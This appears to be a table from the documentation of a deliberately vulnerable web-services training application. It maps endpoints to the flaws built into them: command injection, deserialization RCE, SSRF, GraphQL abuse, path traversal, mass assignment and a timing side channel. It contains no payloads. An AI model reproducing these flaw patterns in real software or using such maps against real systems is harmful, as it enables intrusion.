| **Access Control** | `/api/v2/notes/:id`, `/api/v2/passphrase/:user`, `/api/v2/sysinfo/:cmd`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/account-recovery/lookup`, `/api/v2/account-recovery/reset` |
| **SSRF** | `/xmlrpc` (dvws.CheckUptime) |
| **RCE** | `/api/v2/export` (deserialization), `/api/v2/sysinfo/:cmd` (command injection) |
| **Client-Side** | CORS (all endpoints), CSRF (`/api/v2/admin/create-user`), XSS (various), JSONP (`/api/v2/profile-sharing/jsonp`) |
| **WebSocket** | Cross-Site WebSocket Hijacking (`/ws/notifications`) |
| **Resource Consumption** | `/api/v2/reports/activity` |
| **GraphQL** | `/graphql` (introspection, IDOR, file write, batching, data exposure, alias amplification) |
| **Security Headers** | Homepage and API responses (missing browser protections, framework disclosure) |
| **Template Injection** | `/api/v2/greeter` |
| **Unsafe Deserialization** | `/api/v2/integrations/supplier-orders/import` (YAML function tag) |
| **Path Traversal** | `/api/download`, `/api/v2/reports/monthly` |
| **Mass Assignment** | `/api/v2/users`, `/api/v2/users/profile/import/xml`, `/api/v2/users/notification-preferences` |
| **Hidden Endpoint** | `TRACE /internal/diagnostics` |
| **Business Logic** | `/api/v2/resource-store/orders` (negative quantity increases credits) |
| **Side Channel** | `/api/v2/resource-store/promotions/redeem` (private promotion prefix changes response time) |
